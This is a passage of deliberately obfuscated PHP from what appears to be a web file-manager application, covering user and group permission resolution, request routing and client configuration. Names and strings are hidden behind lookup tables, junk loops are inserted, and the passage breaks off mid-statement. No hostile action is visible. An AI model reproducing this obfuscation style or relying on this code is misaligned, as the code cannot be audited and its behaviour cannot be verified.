$Ü‹º©Ğ¬ ? $Ü‹º©Ğ¬ : USER_ID; $¿†è…ğ¾ = $Ü‹º©Ğ¬ . $Ê‚âš¶ş[2072] . $Öæå¾Ü°; static $áÓƒíÔ· = array(); if (isset($áÓƒíÔ·[$¿†è…ğ¾])) { return $áÓƒíÔ·[$¿†è…ğ¾]; } $çúñğªä = Model($Ê‚âš¶ş[564])->getInfo($Öæå¾Ü°); $‹ğƒ·»¶ = $this->userGroupList($Ü‹º©Ğ¬); $µ¿¡Ì¾ = isset($‹ğƒ·»¶[$Öæå¾Ü°]) ? $‹ğƒ·»¶[$Öæå¾Ü°][$Ê‚âš¶ş[464]] : !1; if ($µ¿¡Ì¾ && Model($Ê‚âš¶ş[550])->authCheckAction($µ¿¡Ì¾[$Ê‚âš¶ş[464]], $Ê‚âš¶ş[1885])) { $áÓƒíÔ·[$¿†è…ğ¾] = $µ¿¡Ì¾; return $µ¿¡Ì¾; } $ÚÃòêã = $this->sourceAuthSelect($çúñğªä[$Ê‚âš¶ş[87]][$Ê‚âš¶ş[181]]); $µ‡œğ’ß = $ÚÃòêã ? $this->authMake($ÚÃòêã, $Ü‹º©Ğ¬) : !1; $¿òæ©×õ = $µ‡œğ’ß ? $µ‡œğ’ß[$Ê‚âš¶ş[517]] : !1; $áÓƒíÔ·[$¿†è…ğ¾] = $¿òæ©×õ ? $¿òæ©×õ : $µ¿¡Ì¾; return $áÓƒíÔ·[$¿†è…ğ¾]; } public function authOwnerApply($²ğ”ğö) { $»·ÒÆ¦ =& $_SERVER[–Ú¬çÁ]; if (empty($²ğ”ğö[$»·ÒÆ¦[464]]) || isset($²ğ”ğö[$»·ÒÆ¦[2073]]) && $²ğ”ğö[$»·ÒÆ¦[2073]]) { return $²ğ”ğö; } if (AuthModel::authCheckRoot($²ğ”ğö[$»·ÒÆ¦[464]][$»·ÒÆ¦[465]])) { return $²ğ”ğö; } $šÌ¬„¤÷ = Model($»·ÒÆ¦[1352])->parentLevelArray($²ğ”ğö[$»·ÒÆ¦[563]]); $šÌ¬„¤÷ = array_merge(array($²ğ”ğö[$»·ÒÆ¦[181]]), array_reverse($šÌ¬„¤÷)); $›ıø’§Ú = $this->sourceAuthSelect($šÌ¬„¤÷); $–ˆù¿Šï = array(); $òøåÊòë = array(); foreach ($›ıø’§Ú as $—ù•øÜ¯ => $¾Í¨úì­) { $´ÊòÖºÎ = $this->authFolderOwnerUser($¾Í¨úì­); $–ˆù¿Šï[$—ù•øÜ¯] = $´ÊòÖºÎ; $òøåÊòë = array_merge($òøåÊòë, $´ÊòÖºÎ[$»·ÒÆ¦[640]]); if ($´ÊòÖºÎ[$»·ÒÆ¦[2074]]) { break; } } if (count($òøåÊòë) == 0) { $òøåÊòë = $this->authFolderOwnerGroup($²ğ”ğö[$»·ÒÆ¦[548]]); } $òøåÊòë = array_unique($òøåÊòë); if (AuthModel::authCheckRoot($²ğ”ğö[$»·ÒÆ¦[464]][$»·ÒÆ¦[465]])) { $òøåÊòë[] = USER_ID; } $²ğ”ğö[$»·ÒÆ¦[464]][$»·ÒÆ¦[2075]] = Model($»·ÒÆ¦[556])->userListInfo($òøåÊòë); return $²ğ”ğö; } private function authFolderOwnerGroup($Û÷µ†²ä) { $å×‰‰­˜ =& $_SERVER[–Ú¬çÁ]; $ù÷·¦§İ = Model($å×‰‰­˜[1954])->where(array($å×‰‰­˜[1864] => $Û÷µ†²ä))->select(); $Û‚Ó¥ = array(); if (!$ù÷·¦§İ) { return $Û‚Ó¥; } foreach ($ù÷·¦§İ as $²ªò½†É) { $¬¸óÁë› = $this->authInfo($²ªò½†É); if (AuthModel::authCheckRoot($¬¸óÁë›[$å×‰‰­˜[464]])) { $Û‚Ó¥[] = $²ªò½†É[$å×‰‰­˜[1666]]; } } return $Û‚Ó¥; } private function authFolderOwnerUser($ÅıìÂ•) { $õ–ˆ´ˆø =& $_SERVER[–Ú¬çÁ]; $çÖ±Éì³ = array(); $‘½—Ä‘— = !1; foreach ($ÅıìÂ• as $šåÇÀ’) { $¤Ò¿¬° = $this->authInfo($šåÇÀ’); if ($šåÇÀ’[$õ–ˆ´ˆø[548]] == $õ–ˆ´ˆø[222]) { $‘½—Ä‘— = !0; } if ($šåÇÀ’[$õ–ˆ´ˆø[178]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¤Ò¿¬°[$õ–ˆ´ˆø[464]])) { $çÖ±Éì³[] = $šåÇÀ’[$õ–ˆ´ˆø[548]]; } } } return array($õ–ˆ´ˆø[640] => $çÖ±Éì³, $õ–ˆ´ˆø[2074] => $‘½—Ä‘—); } public function authMake($¾š‚¨ÈÏ, $ÉØèÄô† = false) { $Ø‰ÙÒå =& $_SERVER[–Ú¬çÁ]; $ı­»¶šÕ = $this->authArrayCheck($¾š‚¨ÈÏ, $ÉØèÄô†); if ($ı­»¶šÕ[$Ø‰ÙÒå[2076]]) { $ı­»¶šÕ[$Ø‰ÙÒå[2076]] = $this->sourceAuthInfo($ı­»¶šÕ[$Ø‰ÙÒå[2076]]); } return $ı­»¶šÕ; } public function authArrayCheck($‘¦­¾¼‡, $Ü–Œõ‹‰ = false) { $şÏ—Ïà¶ =& $_SERVER[–Ú¬çÁ]; if (!$‘¦­¾¼‡) { return array($şÏ—Ïà¶[465] => 0, $şÏ—Ïà¶[517] => !1); } $Ü–Œõ‹‰ = $Ü–Œõ‹‰ ? $Ü–Œõ‹‰ : USER_ID; $Ééûş»ú = 0; $£Õ×¼úµ = 0; $‡·ùùÍ = 0; $Áî ¦Ç¢ = 0; $¡¡üö¬› = 0; $ÕÆê¢ò± = 0; $§Š²‚úĞ = 1000; $àÊœ¦³œ = 0; $äş»»´° = 0; $çŞÎš¤ú = 0; $æñ³ä“Ó = 0; $ß•Ÿš£ = array($şÏ—Ïà¶[181] => 0); foreach ($‘¦­¾¼‡ as $ß•Ÿš£) { $öãò«€Ä = $this->authInfo($ß•Ÿš£); if (!$öãò«€Ä) { continue; } $­×™õ¿„ = $ß•Ÿš£[$şÏ—Ïà¶[548]]; $¯¸¼÷ç» = intval($öãò«€Ä[$şÏ—Ïà¶[464]]); if ($ß•Ÿš£[$şÏ—Ïà¶[178]] == SourceModel::TYPE_USER && $­×™õ¿„ == $Ü–Œõ‹‰) { $Ééûş»ú = !0; $‡·ùùÍ = $öãò«€Ä; $£Õ×¼úµ = $¯¸¼÷ç»; } else { if ($ß•Ÿš£[$şÏ—Ïà¶[178]] == SourceModel::TYPE_GROUP && $this->groupContainUser($­×™õ¿„, $Ü–Œõ‹‰)) { $Áî ¦Ç¢ = !0; $â¿—™ï = $this->groupStepToUserGroup($­×™õ¿„, $Ü–Œõ‹‰); if ($â¿—™ï < $§Š²‚úĞ) { $§Š²‚úĞ = $â¿—™ï; $¡¡üö¬› = $¯¸¼÷ç»; $ÕÆê¢ò± = $öãò«€Ä; $àÊœ¦³œ = $­×™õ¿„; } if ($â¿—™ï == $§Š²‚úĞ && $¯¸¼÷ç» >= $¡¡üö¬›) { $¡¡üö¬› = $¯¸¼÷ç»; $ÕÆê¢ò± = $öãò«€Ä; $àÊœ¦³œ = $­×™õ¿„; } } else { if ($­×™õ¿„ == $şÏ—Ïà¶[222]) { $äş»»´° = !0; $æñ³ä“Ó = $öãò«€Ä; $çŞÎš¤ú = $¯¸¼÷ç»; } } } } if ($Ééûş»ú) { $Ã­ŞÛØ˜ = $£Õ×¼úµ; $öãò«€Ä = $‡·ùùÍ; $ç•Ö¾ä = LNG($şÏ—Ïà¶[2077]); } else { if ($Áî ¦Ç¢) { $Ã­ŞÛØ˜ = $¡¡üö¬›; $öãò«€Ä = $ÕÆê¢ò±; $ŞÇµ½ÍŸ = Model($şÏ—Ïà¶[564])->getInfo($àÊœ¦³œ); $ç•Ö¾ä = $şÏ—Ïà¶[163] . $ŞÇµ½ÍŸ[$şÏ—Ïà¶[568]] . $şÏ—Ïà¶[2078] . LNG($şÏ—Ïà¶[2079]); } else { if ($äş»»´°) { $Ã­ŞÛØ˜ = $çŞÎš¤ú; $öãò«€Ä = $æñ³ä“Ó; $ç•Ö¾ä = LNG($şÏ—Ïà¶[2050]); } else { $Ã­ŞÛØ˜ = 0; $öãò«€Ä = !1; $ç•Ö¾ä = $şÏ—Ïà¶[12]; } } } $Š˜é¥‡Ä = array($şÏ—Ïà¶[2069] => intval($Ã­ŞÛØ˜), $şÏ—Ïà¶[2053] => $öãò«€Ä, $şÏ—Ïà¶[2070] => $ç•Ö¾ä, $şÏ—Ïà¶[2062] => $ß•Ÿš£[$şÏ—Ïà¶[181]]); return $Š˜é¥‡Ä; } private function groupContainUser($ÌÑĞñô£, $¹ÑœûÃñ = false) { return in_array($ÌÑĞñô£, $this->userGroupParents($¹ÑœûÃñ)); } private function groupStepToUserGroup($Æıºû´È, $ü è„Ğ¾ = false) { $“‡ìŠ =& $_SERVER[–Ú¬çÁ]; $Ş¼™ë˜‰ = $this->userGroupList($ü è„Ğ¾); $êÄäğùœ = 1000; $´°¾ëÇ = $GLOBALS[$“‡ìŠ[6]][$“‡ìŠ[89]][$“‡ìŠ[1967]] == 1; $ÜçãÈ— = $´°¾ëÇ ? 3 : 2; foreach ($Ş¼™ë˜‰ as $¦“€’¸) { if ($¦“€’¸[$“‡ìŠ[1864]] == $Æıºû´È) { return 0; } $ƒ’å«‹Ò = explode($“‡ìŠ[50], trim($¦“€’¸[$“‡ìŠ[563]], $“‡ìŠ[50])); if ($ƒ’å«‹Ò[0] == $“‡ìŠ[222] && count($ƒ’å«‹Ò) > $ÜçãÈ—) { $± Ûµ† = array_reverse(array_slice($ƒ’å«‹Ò, $ÜçãÈ—)); $úŠÄÕŠŒ = array_search($Æıºû´È, $± Ûµ†); if ($úŠÄÕŠŒ !== !1 && $úŠÄÕŠŒ + 1 <= $êÄäğùœ) { $êÄäğùœ = $úŠÄÕŠŒ + 1; } } } return $êÄäğùœ; } private function userGroupList($´šÙ‘÷œ = false) { $¶íšñá€ =& $_SERVER[–Ú¬çÁ]; static $“Ñ¸†§ = array(); if (isset($“Ñ¸†§[$´šÙ‘÷œ])) { return $“Ñ¸†§[$´šÙ‘÷œ]; } $ŸØ¾™È = Model($¶íšñá€[577])->getInfo($´šÙ‘÷œ); $“Ñ¸†§[$´šÙ‘÷œ] = array_to_keyvalue($ŸØ¾™È[$¶íšñá€[2051]], $¶íšñá€[1864]); return $“Ñ¸†§[$´šÙ‘÷œ]; } public function userGroupParents($é‚‘²ÑØ) { $³İáØ´å =& $_SERVER[–Ú¬çÁ]; static $úÇò£¾Î = array(); $é‚‘²ÑØ = $é‚‘²ÑØ ? $é‚‘²ÑØ : USER_ID; if (isset($úÇò£¾Î[$é‚‘²ÑØ])) { return $úÇò£¾Î[$é‚‘²ÑØ]; } $É ıå÷ù = $this->userGroupList($é‚‘²ÑØ); $™‘ø™Ââ = array(); $¸×è¾³â = $GLOBALS[$³İáØ´å[6]][$³İáØ´å[89]][$³İáØ´å[1967]] == 1; $‡§›êÉ  = $¸×è¾³â ? 3 : 2; foreach ($É ıå÷ù as $¦ƒú•µ) { $Ş–ÚĞà« = array($¦ƒú•µ[$³İáØ´å[1864]]); $ÈŠ§¨’È = explode($³İáØ´å[50], trim($¦ƒú•µ[$³İáØ´å[563]], $³İáØ´å[50])); if ($ÈŠ§¨’È[0] == $³İáØ´å[222] && count($ÈŠ§¨’È) > $‡§›êÉ ) { $‹²ÆÏ“ = array_slice($ÈŠ§¨’È, $‡§›êÉ ); $Ş–ÚĞà« = array_merge($Ş–ÚĞà«, array_reverse($‹²ÆÏ“)); } $™‘ø™Ââ = array_merge($™‘ø™Ââ, $Ş–ÚĞà«); } $úÇò£¾Î[$é‚‘²ÑØ] = array_unique($™‘ø™Ââ); return $úÇò£¾Î[$é‚‘²ÑØ]; } public function authTargetInfoMake($¬ˆ°¦ó’) { $ö¶­Û¼ =& $_SERVER[–Ú¬çÁ]; $çãß–Û¡ = array(); $î”ú¹Ù¦ = array(); foreach ($¬ˆ°¦ó’ as $Ùø€î±) { if ($Ùø€î±[$ö¶­Û¼[178]] == SourceModel::TYPE_USER) { $çãß–Û¡[] = intval($Ùø€î±[$ö¶­Û¼[548]]); } else { if ($Ùø€î±[$ö¶­Û¼[178]] == SourceModel::TYPE_GROUP) { $î”ú¹Ù¦[] = intval($Ùø€î±[$ö¶­Û¼[548]]); } } } if ($çãß–Û¡) { $çãß–Û¡ = Model($ö¶­Û¼[556])->userListInfo($çãß–Û¡); } if ($î”ú¹Ù¦) { $Ø…©‡· = array($ö¶­Û¼[1952] => array($ö¶­Û¼[469], $î”ú¹Ù¦)); $î”ú¹Ù¦ = Model($ö¶­Û¼[564])->field($ö¶­Û¼[2080])->where($Ø…©‡·)->select(); $î”ú¹Ù¦ = array_to_keyvalue($î”ú¹Ù¦, $ö¶­Û¼[1864]); } return array($ö¶­Û¼[2081] => $çãß–Û¡, $ö¶­Û¼[2082] => $î”ú¹Ù¦); } public function authInfo($ÇÕ°µÜ) { $‡í½é =& $_SERVER[–Ú¬çÁ]; if ($ÇÕ°µÜ[$‡í½é[1968]]) { $ƒ÷€è½‚ = Model($‡í½é[550])->listData($ÇÕ°µÜ[$‡í½é[1968]]); if (!$ƒ÷€è½‚) { return !1; $×Ğ¥Ä = Model($‡í½é[550])->listData(); $èÄñ‡§ = array_filter_by_field($×Ğ¥Ä, $‡í½é[464], $‡í½é[222]); return $èÄñ‡§; } $„˜Îò€‚ = array_field_key($ƒ÷€è½‚, array($‡í½é[452], $‡í½é[32], $‡í½é[464], $‡í½é[1887], $‡í½é[1888])); $„˜Îò€‚[$‡í½é[2083]] = $ÇÕ°µÜ; return $„˜Îò€‚; } else { return array($‡í½é[470] => 0, $‡í½é[1870] => $ÇÕ°µÜ[$‡í½é[2028]], $‡í½é[471] => $‡í½é[12], $‡í½é[1887] => $‡í½é[2084]); } } } goto cßØÚßï“ˆ; CÜ³Î¾‰·: class Application { private $defaultModule = "\x69\156\144\x65\170"; private $defaultController = "\x69\x6e\x64\x65\170"; private $defaultAction = "\x69\156\x64\x65\x78"; function __construct() { } public function setDefault($¯Ğ¾ºš) { $ªÒ¤ññ =& $_SERVER[–Ú¬çÁ]; $•‰¥¾ªƒ =& $_SERVER[¨­üö¨œ]; $œŠùŸß¿ = explode($•‰¥¾ªƒ[0], trim($¯Ğ¾ºš, $•‰¥¾ªƒ[0])); $this->defaultModule = $œŠùŸß¿[0] ? $œŠùŸß¿[0] : $this->defaultModule; $ç¶¹Ê¡ = $ªÒ¤ññ[662]; while (strlen($ç¶¹Ê¡) < $ªÒ¤ññ[207]) { if (!$ç¶¹Ê¡) { break; } $ç¶¹Ê¡++; } $this->defaultController = $œŠùŸß¿[1] ? $œŠùŸß¿[1] : $this->defaultController; $this->defaultAction = $œŠùŸß¿[2] ? $œŠùŸß¿[2] : $this->defaultAction; $this->ymzib5965645($•‰¥¾ªƒ[1], array($this, $•‰¥¾ªƒ[2])); } public function appRun($İëŸÂçÁ) { $×æôç° =& $_SERVER[¨­üö¨œ]; $œá™Â‡ = explode($×æôç°[0], $İëŸÂçÁ); $èëôèø = $_SERVER[–Ú¬çÁ][663]; if (!$èëôèø) { die; } $õ’ë”µ = strtolower($œá™Â‡[0]); $·¹¥İ¨ã = $×æôç°[3]; if ($õ’ë”µ == $×æôç°[4]) { $·¹¥İ¨ã = $×æôç°[5]; $œá™Â‡[0] = $×æôç°[6]; $œá™Â‡[1] = $œá™Â‡[1] . $×æôç°[7]; $İëŸÂçÁ = join($×æôç°[0], $œá™Â‡); $İëŸÂçÁ = trim($İëŸÂçÁ, $×æôç°[0]); } call_user_func(array($×æôç°[8], $×æôç°[9]), $·¹¥İ¨ã . $×æôç°[10], $İëŸÂçÁ); ActionCall($İëŸÂçÁ); call_user_func(array($×æôç°[8], $×æôç°[9]), $·¹¥İ¨ã . $×æôç°[11], $İëŸÂçÁ); } private function autorun() { $ÖëÎçç“ =& $_SERVER[–Ú¬çÁ]; $åÁÖÚ‡„ =& $_SERVER[¨­üö¨œ]; global $config; $Ê‰ú›ÅÛ = $ÖëÎçç“[664]; while (strlen($Ê‰ú›ÅÛ) < $ÖëÎçç“[665]) { if (!$Ê‰ú›ÅÛ) { break; } $Ê‰ú›ÅÛ++; } if (count($config[$åÁÖÚ‡„[12]]) == 0) { return; } foreach ($config[$åÁÖÚ‡„[12]] as $ìÖË©¹‘ => $øİ‡›éğ) { $this->appRun($øİ‡›éğ); } } private function xcsyd3f76cd3() { $ÆˆêĞà˜ =& $_SERVER[–Ú¬çÁ]; $È¯†¾Õ =& $_SERVER[¨­üö¨œ]; $™¤Îˆó = $È¯†¾Õ[4]; $şªìÀö· = $GLOBALS[$È¯†¾Õ[13]][$È¯†¾Õ[14]][0]; $ĞÙ¥°æ = $ÆˆêĞà˜[666]; if (!$şªìÀö· || strlen($şªìÀö·) <= strlen($™¤Îˆó)) { return; } if (strtolower(substr($şªìÀö·, -strlen($™¤Îˆó))) != $™¤Îˆó) { return; } $ãÈøÖ… = substr($şªìÀö·, 0, -strlen($™¤Îˆó)); $’ğõ‰ó = $ÆˆêĞà˜[667]; if (strlen($’ğõ‰ó) < $ÆˆêĞà˜[665]) { return; } $ÛˆıíáĞ = array($È¯†¾Õ[4], $ãÈøÖ…); $À¦­éŸ = $ÆˆêĞà˜[668]; if (!$À¦­éŸ) { die; } $Ÿ¥‹¸ï = array_slice($GLOBALS[$È¯†¾Õ[13]][$È¯†¾Õ[14]], 1); $GLOBALS[$È¯†¾Õ[13]][$È¯†¾Õ[14]] = array_merge($ÛˆıíáĞ, $Ÿ¥‹¸ï); $Ö»Î¥ = $ÆˆêĞà˜[669]; if (strlen($Ö»Î¥) < $ÆˆêĞà˜[658]) { return; } $GLOBALS[$È¯†¾Õ[13]][$È¯†¾Õ[15]] = implode($È¯†¾Õ[0], $GLOBALS[$È¯†¾Õ[13]][$È¯†¾Õ[14]]); } private function ixescfe6bd0c() { $’Ä•Îß» =& $_SERVER[–Ú¬çÁ]; $™¬ïœêñ =& $_SERVER[¨­üö¨œ]; if ($GLOBALS[$™¬ïœêñ[13]][$™¬ïœêñ[15]] != $™¬ïœêñ[6]) { return; } $Çº·ÀÉ¨ = $_SERVER[$™¬ïœêñ[16]]; $§ï—äø¼ = $’Ä•Îß»[670]; if (strlen($§ï—äø¼) < $’Ä•Îß»[671]) { return; } $±‹İ³²ô = $™¬ïœêñ[17]; if (!strstr($Çº·ÀÉ¨, $±‹İ³²ô)) { return; } $“ñŞÅ‘í = strrpos($Çº·ÀÉ¨, $±‹İ³²ô); $¢ïåÅ¯Ë = substr($Çº·ÀÉ¨, $“ñŞÅ‘í + strlen($±‹İ³²ô)); preg_match_all($™¬ïœêñ[18], $¢ïåÅ¯Ë, $çÄû÷üÕ); $œŒ…‹²Ä = $’Ä•Îß»[672]; if (!$œŒ…‹²Ä) { die; } $¢ïåÅ¯Ë = trim($çÄû÷üÕ[0][0], $™¬ïœêñ[19]); $GLOBALS[$™¬ïœêñ[13]][$™¬ïœêñ[14]] = explode($™¬ïœêñ[19], $¢ïåÅ¯Ë); $GLOBALS[$™¬ïœêñ[13]][$™¬ïœêñ[15]] = implode($™¬ïœêñ[0], $GLOBALS[$™¬ïœêñ[13]][$™¬ïœêñ[14]]); } public function run() { $ôÛ«óíä =& $_SERVER[–Ú¬çÁ]; $ ³ªøøÙ =& $_SERVER[¨­üö¨œ]; $this->ixescfe6bd0c(); $this->xcsyd3f76cd3(); $¥¿¬´‰’ = $GLOBALS[$ ³ªøøÙ[13]][$ ³ªøøÙ[14]]; $¢™¶ŞÖ = $GLOBALS[$ ³ªøøÙ[13]][$ ³ªøøÙ[15]]; $•Ê ğ›Î = $ôÛ«óíä[673]; define($ ³ªøøÙ[20], isset($¥¿¬´‰’[0]) && $¥¿¬´‰’[0] ? $¥¿¬´‰’[0] : $this->defaultModule); $šÈæÄ¯ò = $ôÛ«óíä[674]; define($ ³ªøøÙ[21], isset($¥¿¬´‰’[1]) && $¥¿¬´‰’[0] ? $¥¿¬´‰’[1] : $this->defaultController); define($ ³ªøøÙ[22], isset($¥¿¬´‰’[2]) && $¥¿¬´‰’[0] ? $¥¿¬´‰’[2] : $this->defaultAction); $‰Õ†º¥¢ = $ôÛ«óíä[675]; if (strlen($‰Õ†º¥¢) < $ôÛ«óíä[207]) { die; } define($ ³ªøøÙ[23], MOD . $ ³ªøøÙ[0] . ST . $ ³ªøøÙ[0] . ACT); $_SERVER[$ ³ªøøÙ[24]] = strtolower(ACTION); $this->autorun(); $ÄªóôÑœ = $ôÛ«óíä[676]; if (count($¥¿¬´‰’) >= 3) { $this->appRun($¢™¶ŞÖ); } else { $this->appRun(ACTION); } } private $xbiqa198edc4 = array(); private $tqzhbfc8f26c = ''; public function owufdaf252c7() { $å¢ğŞşÖ =& $_SERVER[–Ú¬çÁ]; $«úÈ´Ä“ =& $_SERVER[¨­üö¨œ]; $this->qhpwee5f1ae4(); $†ùÖ÷Ê• = $å¢ğŞşÖ[677]; if (strlen($†ùÖ÷Ê•) < $å¢ğŞşÖ[665]) { die; } $this->ckold9ff08b3(); $this->yadre2a33022(); $this->crbt788b6207(); $this->jqgobd5ae2d3(); $öèºØ’ = $å¢ğŞşÖ[678]; while (strlen($öèºØ’) < $å¢ğŞşÖ[665]) { if (!$öèºØ’) { break; } $öèºØ’++; } $this->drhf5aed26a4(); $this->rsuic979aa44(); $this->ymzib5965645($«úÈ´Ä“[25], array($this, $«úÈ´Ä“[26])); $ÒÍ÷ÕÍ† = $å¢ğŞşÖ[679]; if (!$ÒÍ÷ÕÍ†) { return; } $this->ymzib5965645($«úÈ´Ä“[27], array($this, $«úÈ´Ä“[28])); $this->ymzib5965645($«úÈ´Ä“[29], array($this, $«úÈ´Ä“[30])); $this->ymzib5965645($«úÈ´Ä“[31], array($this, $«úÈ´Ä“[32])); } public function ltrb1dad8560($€™˜ôıü) { $®´ò»âó =& $_SERVER[–Ú¬çÁ]; $Âà˜œ­¿ =& $_SERVER[¨­üö¨œ]; $åĞäÍ‹ = Model($Âà˜œ­¿[33])->get(); $®š£™˜ = array($Âà˜œ­¿[34], $Âà˜œ­¿[35], $Âà˜œ­¿[36], $Âà˜œ­¿[37], $Âà˜œ­¿[38], $Âà˜œ­¿[39], $Âà˜œ­¿[40], $Âà˜œ­¿[41], $Âà˜œ­¿[42], $Âà˜œ­¿[43], $Âà˜œ­¿[44], $Âà˜œ­¿[45], $Âà˜œ­¿[46], $Âà˜œ­¿[47], $Âà˜œ­¿[48], $Âà˜œ­¿[49], $Âà˜œ­¿[50], $Âà˜œ­¿[51], $Âà˜œ­¿[52], $Âà˜œ­¿[53], $Âà˜œ­¿[54], $Âà˜œ­¿[55], $Âà˜œ­¿[56], $Âà˜œ­¿[57], $Âà˜œ­¿[58], $Âà˜œ­¿[59], $Âà˜œ­¿[60], $Âà˜œ­¿[61], $Âà˜œ­¿[62], $Âà˜œ­¿[63], $Âà˜œ­¿[64], $Âà˜œ­¿[65], $Âà˜œ­¿[66], $Âà˜œ­¿[67], $Âà˜œ­¿[68], $Âà˜œ­¿[69], $Âà˜œ­¿[70], $Âà˜œ­¿[71], $Âà˜œ­¿[72], $Âà˜œ­¿[73], $Âà˜œ­¿[74], $Âà˜œ­¿[75], $Âà˜œ­¿[76], $Âà˜œ­¿[77], $Âà˜œ­¿[78], $Âà˜œ­¿[79], $Âà˜œ­¿[80], $Âà˜œ­¿[81], $Âà˜œ­¿[82], $Âà˜œ­¿[83], $Âà˜œ­¿[84]); $µ×‰ Ô = $®´ò»âó[680]; while (strlen($µ×‰ Ô) < $®´ò»âó[207]) { if (!$µ×‰ Ô) { break; } $µ×‰ Ô++; } foreach ($®š£™˜ as $ÀÜ§ÈŒş) { $á‹«—¯Ğ = $GLOBALS[$Âà˜œ­¿[85]][$Âà˜œ­¿[86]][$ÀÜ§ÈŒş]; if (isset($åĞäÍ‹[$ÀÜ§ÈŒş])) { $á‹«—¯Ğ = $åĞäÍ‹[$ÀÜ§ÈŒş]; } $€™˜ôıü[$Âà˜œ­¿[87]][$Âà˜œ­¿[88]][$ÀÜ§ÈŒş] = $á‹«—¯Ğ; } $º¡ûÇÖ = $€™˜ôıü[$Âà˜œ­¿[87]][$Âà˜œ­¿[88]][$Âà˜œ­¿[46]]; $ï°ï¯Ôß = $®´ò»âó[681]; unset($€™˜ôıü[$Âà˜œ­¿[87]][$Âà˜œ­¿[89]][$Âà˜œ­¿[90]]); $›¯Ïõé´ = $®´ò»âó[682]; while (strlen($›¯Ïõé´) < $®´ò»âó[207]) { if (!$›¯Ïõé´) { break; } $›¯Ïõé´++; } unset($€™˜ôıü[$Âà˜œ­¿[87]][$Âà˜œ­¿[89]][$Âà˜œ­¿[91]]); $Ù¥‚¡Åü = $®´ò»âó[683]; if (!$Ù¥‚¡Åü) { die; } unset($€™˜ôıü[$Âà˜œ­¿[87]][$Âà˜œ­¿[88]][$Âà˜œ­¿[46]]); unset($€™˜ôıü[$Âà˜œ­¿[87]][$Âà˜œ­¿[88]][$Âà˜œ­¿[92]]); $éÕİªÌ— = $®´ò»âó[684]; if (!$éÕİªÌ—) { die; } $€™˜ôıü[$Âà˜œ­¿[87]][$Âà˜œ­¿[88]][$Âà˜œ­¿[93]] = array($Âà˜œ­¿[94] => (int) $º¡ûÇÖ[$Âà˜œ­¿[95]], $Âà˜œ­¿[96] => (int) _get($º¡ûÇÖ, $Âà˜œ­¿[97], 0)); $ÂĞ›ÖÖŞ = $®´ò»âó[685]; if (strlen($ÂĞ›ÖÖŞ) < $®´ò»âó[665]) { die; } $©Çæ‚Üó = substr(md5($Âà˜œ­¿[98] . get_client_ip() . $åĞäÍ‹[$Âà˜œ­¿[99]]), 0, 15); $÷Ú¼“ò = $®´ò»âó[686]; $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[101]] = Mcrypt::encode(Session::sign(), $©Çæ‚Üó, 3600 * 24); $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[102]] = Action($Âà˜œ­¿[103])->accessToken(); $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[104]] = md5($_SERVER[$Âà˜œ­¿[105]] . $åĞäÍ‹[$Âà˜œ­¿[99]]); $ÔÔ°µÂ” = $®´ò»âó[687]; while (strlen($ÔÔ°µÂ”) < $®´ò»âó[207]) { if (!$ÔÔ°µÂ”) { break; } $ÔÔ°µÂ”++; } $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[106]] = base64_encode(serverInfo()); $İĞœŸ¹Ş = $®´ò»âó[688]; while (strlen($İĞœŸ¹Ş) < $®´ò»âó[665]) { if (!$İĞœŸ¹Ş) { break; } $İĞœŸ¹Ş++; } $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[107]] = $this->tqzhbfc8f26c; $ú¶Ùıùç = $®´ò»âó[689]; while (strlen($ú¶Ùıùç) < $®´ò»âó[690]) { if (!$ú¶Ùıùç) { break; } $ú¶Ùıùç++; } if ($åĞäÍ‹[$Âà˜œ­¿[107]] != $Âà˜œ­¿[108]) { $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[109]] = $åĞäÍ‹[$Âà˜œ­¿[109]]; $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[110]] = $åĞäÍ‹[$Âà˜œ­¿[110]]; $ß»ö¤¿† = rand_string(10) . $this->tqzhbfc8f26c . rand_string(5); $€™˜ôıü[$Âà˜œ­¿[87]][$Âà˜œ­¿[111]][$Âà˜œ­¿[112]] = $this->yozf31e9d1c9($ß»ö¤¿†, $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[104]]); } if ($this->tqzhbfc8f26c == $Âà˜œ­¿[108]) { $€™˜ôıü[$Âà˜œ­¿[87]][$Âà˜œ­¿[88]][$Âà˜œ­¿[93]][$Âà˜œ­¿[97]] = 0; } $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[113]] = _get($this->xbiqa198edc4, $Âà˜œ­¿[114], $Âà˜œ­¿[6]); $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[115]] = _get($this->xbiqa198edc4, $Âà˜œ­¿[116], $Âà˜œ­¿[6]); if (_get($GLOBALS, $Âà˜œ­¿[117]) && $this->config[$Âà˜œ­¿[118]]) { $€™˜ôıü[$Âà˜œ­¿[100]][$Âà˜œ­¿[119]] = WEB_ROOT; } return $€™˜ôıü; } private function drhf5aed26a4() { $ú¢·±æ =& $_SERVER[–Ú¬çÁ]; $Ö…úª§ =& $_SERVER[¨­üö¨œ]; $×ì´¥±Ü = $_SERVER[$Ö…úª§[24]] == $Ö…úª§[120]; if ($_SERVER[$Ö…úª§[24]] == $Ö…úª§[121] && $_GET[$Ö…úª§[122]] == $Ö…úª§[123]) { $×ì´¥±Ü = !0; } if ($×ì´¥±Ü) { $íé›Ùˆ = array($Ö…úª§[107] => $this->tqzhbfc8f26c, $Ö…úª§[124] => $this->pfki17fd495d(), $Ö…úª§[125] => Model($Ö…úª§[126])->count()); if ($this->tqzhbfc8f26c != $Ö…úª§[108]) { $Ç¥›à…– = _get($this->xbiqa198edc4, $Ö…úª§[127]); if ($Ç¥›à…–) { $íé›Ùˆ[$Ö…úª§[128]] = $Ç¥›à…–; $íé›Ùˆ[$Ö…úª§[129]] = strtotime(_get($this->xbiqa198edc4, $Ö…úª§[130])); $íé›Ùˆ[$Ö…úª§[131]] = _get($this->xbiqa198edc4, $Ö…úª§[116]); } $Ïµôñ»× = Model($Ö…úª§[33])->get($Ö…úª§[132], $Ö…úª§[6], !0); if (is_string($Ïµôñ»×) && substr($Ïµôñ»×, 0, 1) == $Ö…úª§[133]) { 